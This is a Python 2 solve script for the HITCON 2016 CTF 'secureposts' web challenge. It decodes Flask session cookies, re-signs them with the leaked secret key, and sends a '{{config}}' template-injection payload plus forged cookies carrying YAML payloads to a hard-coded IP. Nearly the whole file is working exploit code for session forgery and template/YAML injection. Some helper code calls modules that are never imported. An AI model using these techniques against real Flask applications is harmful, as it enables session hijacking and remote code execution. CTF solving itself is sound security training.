# hitcon-ctf-quals-2016 - secureposts
# also see https://github.com/noraj1337/flask-session-cookie-manager (havent tested)
import requests
import re
import zlib
from itsdangerous import base64_decode
from base64 import b64decode
import json
from flask.sessions import SecureCookieSessionInterface

class MockApp(object):
    def __init__(self, secret_key):
        self.secret_key = secret_key

def encode(secret_key, session_cookie_structure):
    """Encode a Flask cookie."""
    """http://saruberoz.github.io/flask-session-cookie-decoder-slash-encoder/"""
    try:
        app = MockApp(secret_key)

        #session_cookie_structure = dict() # bug fixed
        si = SecureCookieSessionInterface()
        s = si.get_signing_serializer(app)

        return s.dumps(session_cookie_structure)
    except Exception as e:
        return "[Encoding error]{}".format(e)

def decode(cookie):
    """Decode a Flask cookie."""
    """https://github.com/in-s-ane/tjctf-2015/blob/master/Short-URL_200/flask_session_cookie_decoder.py"""
    def flask_loads(value):
        def object_hook(obj):
            if len(obj) != 1:
                return obj
            the_key, the_value = next(obj.iteritems())
            if the_key == ' t':
                return str(tuple(the_value))
            elif the_key == ' u':
                return str(uuid.UUID(the_value))
            elif the_key == ' b':
                return str(b64decode(the_value))
            elif the_key == ' m':
                return str(Markup(the_value))
            elif the_key == ' d':
                return str(parse_date(the_value))
            return obj
        return json.loads(value, object_hook=object_hook)

    try:
        compressed = False
        payload = cookie

        if payload.startswith(b'.'):
            compressed = True
            payload = payload[1:]

        data = payload.split(".")[0]

        data = base64_decode(data)
        if compressed:
            data = zlib.decompress(data)

        return flask_loads(data)
    except Exception, e:
        print e
        return "[Decoding error: are you sure this was a Flask session cookie?]"

secret_key = 'hitcon{>_<---Do-you-know-<script>alert(1)</script>-is-very-fun?}'

def securepost1(author='{{config}}'):
    sess = requests.Session()
    sess.proxies = {'http': 'http://127.0.0.1:8082'}

    r = sess.get('http://52.69.126.212/')
    r = sess.post('http://52.69.126.212/post', data={'title': 'moi', 'author': author, 'content': 'blah', 'datatype': 'json'})

    author = author[:10]
    print 'author: %r %d' % (author, len(author))

    m = re.search('id="author" name="author" placeholder="Enter title" value="(.+?)"', r.content)
    if not m or r.status_code == 500:
        return False
    
    print m.group(1) 

def securepost2(payload):
    sess = requests.Session()
    sess.proxies = {'http': 'http://127.0.0.1:8082'}

    r = sess.post('http://52.69.126.212/post', data={'title': 'moi', 'author': 'seb', 'content': 'blah', 'datatype': 'yaml'})
    
    dec = decode(r.cookies['session'])
    print 'decoded cookie: %s' % dec

    #dec = {u'post_type': u'yaml', u'post_data': u"- {author: admin, content: PAYLOAD, date: 'October 08, 2016 02:00:00', title: Welcome!}\n", u'name': u'seb'}
    dec['post_data'] = dec['post_data'].replace('blah', payload)
    print 'updated cookie: %s' % dec

    enc = encode(secret_key, dec)
    print 'encoded cookie: %s' % enc

    del sess.cookies['session']
    sess.cookies.update({'session': enc})

    r = sess.get('http://52.69.126.212/')

    m = re.search('id="author" name="author" placeholder="Enter title" value="(.+?)"', r.content)
    if not m or r.status_code == 500:
        print 'NOT OK'
        return False

    print 'OK'
    return True
